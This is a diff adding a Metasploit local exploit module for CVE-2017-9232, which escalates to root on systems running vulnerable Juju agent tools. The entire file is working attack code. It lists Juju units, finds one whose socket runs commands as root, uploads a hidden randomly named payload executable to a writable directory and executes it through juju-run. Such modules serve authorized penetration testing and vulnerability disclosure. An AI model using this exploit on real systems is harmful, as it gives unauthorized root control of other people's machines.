@@ -1,0 +1,132 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Post::File
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Juju-run Agent Privilege Escalation',
+      'Description'    => %q{
+        This module attempts to gain root privileges on Juju agent systems
+        running the juju-run agent utility.
+
+        Juju agent systems running agent tools prior to version 1.25.12,
+        2.0.x before 2.0.4, and 2.1.x before 2.1.3, provide a UNIX domain socket
+        to manage software ("units") without setting appropriate permissions,
+        allowing unprivileged local users to execute arbitrary commands as root.
+
+        This module has been tested successfully with Juju agent tools versions
+        1.18.4, 1.25.5 and 1.25.9 on Ubuntu 14.04.1 LTS x86 deployed by Juju
+        1.18.1-trusty-amd64 and 1.25.6-trusty-amd64 on Ubuntu 14.04.1 LTS x86_64.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Ryan Beisner', # Discovery and PoC
+          'David Ames (@thedac)', # Discovery and PoC
+          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit
+        ],
+      'DisclosureDate' => 'Apr 13 2017',
+      'Platform'       => [ 'linux' ],
+      'Arch'           => [ ARCH_X86, ARCH_X64 ],
+      'SessionTypes'   => [ 'shell', 'meterpreter' ],
+      'Targets'        => [[ 'Auto', {} ]],
+      'References'     =>
+        [
+          [ 'CVE', '2017-9232' ],
+          [ 'BID', '98737' ],
+          [ 'URL', 'https://bugs.launchpad.net/juju/+bug/1682411' ]
+        ]
+    ))
+    register_options(
+      [
+        OptString.new('UNIT', [ false, 'A valid Juju unit name', '' ]),
+        OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
+      ])
+  end
+
+  def check
+    juju_run_path = cmd_exec 'which juju-run'
+
+    if juju_run_path.start_with? '/'
+      vprint_good 'juju-run is installed'
+      return CheckCode::Detected
+    end
+
+    vprint_error 'juju-run is NOT installed'
+
+    CheckCode::Safe
+  end
+
+  def unit_names
+    units = []
+
+    cmd_exec('/bin/ls -m /var/log/juju/*.log').chomp.split(/,\s*/).each do |log|
+      units << ::File.basename(log).gsub(/\.log$/, '')
+    end
+
+    cmd_exec('/bin/ls -m /var/lib/juju/agents/').chomp.split(/,\s*/).each do |agent|
+      units << ::File.basename(agent)
+    end
+
+    units.uniq
+  end
+
+  def execute_command(cmd, opts = {})
+    cmd_exec "juju-run #{opts['unit']} '#{cmd}'"
+  end
+
+  def upload_and_chmodx(path, data)
+    print_status "Writing '#{path}' (#{data.size} bytes) ..."
+    rm_f path
+    write_file path, data
+    cmd_exec "chmod +x '#{path}'"
+    register_file_for_cleanup path
+  end
+
+  def exploit
+    if check != CheckCode::Detected
+      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
+    end
+
+    units = datastore['UNIT'].blank? ? unit_names : [ datastore['UNIT'] ]
+
+    if units.empty?
+      fail_with Failure::Unknown, "Could not find any Juju units. Try specifying a 'UNIT'"
+    end
+
+    # Check each unit for a privileged socket
+    print_status "Trying #{units.size} units..."
+
+    socket_unit = nil
+    unit_names.each do |unit|
+      id = execute_command 'id', 'unit' => unit
+
+      if id.include? 'root'
+        print_good "Unit #{unit.inspect} uses a privileged socket"
+        socket_unit = unit
+        break
+      end
+    end
+
+    if socket_unit.nil?
+      fail_with Failure::NotVulnerable, 'Could not find any Juju units using a privileged socket'
+    end
+
+    # Upload payload executable
+    payload_name = ".#{rand_text_alphanumeric rand(5..10)}"
+    payload_path = "#{datastore['WritableDir']}/#{payload_name}"
+    upload_and_chmodx payload_path, generate_payload_exe
+
+    # Execute payload executable
+    vprint_status 'Executing payload...'
+    execute_command payload_path, 'unit' => socket_unit
+  end
+end
